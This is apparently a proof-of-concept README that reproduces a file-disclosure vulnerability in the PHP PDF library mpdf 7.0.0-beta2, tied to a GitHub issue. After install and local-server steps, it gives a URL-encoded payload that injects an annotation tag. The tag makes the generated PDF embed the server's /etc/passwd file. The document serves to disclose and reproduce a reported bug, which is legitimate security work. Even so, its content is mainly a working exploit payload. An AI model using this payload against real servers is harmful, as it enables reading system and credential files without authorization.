# POC for Vulnerability in PHP package `mpdf/mpdf`

- **Issue**: [#356](https://github.com/mpdf/mpdf/issues/356)
- **Package Repository**: [mPDF GitHub](https://github.com/mpdf/mpdf)
- **Package Manager**: [Packagist mPDF](https://packagist.org/packages/mpdf/mpdf)

## Steps to Reproduce

1. Install a vulnerable version of `mpdf/mpdf`: ```composer require mpdf/mpdf:7.0.0-beta2```
2. Start the website locally: ```php -S localhost:8000```
3. In the browser, go to ```http://localhost:8000/index.php?url=%3Cannotation%20file=%22/etc/passwd%22%20content=%22/etc/passwd%22%20icon=%22Graph%22%20title=%22Attached%20File:%20/etc/passwd%22%20pos-x=%22195%22%20/%3E```
4. A PDF file will be generated with a malicious annotation tag. If you download the pdf and click the annotation, you will see that it opens the stolen server file, in this case ```/etc/passwd```.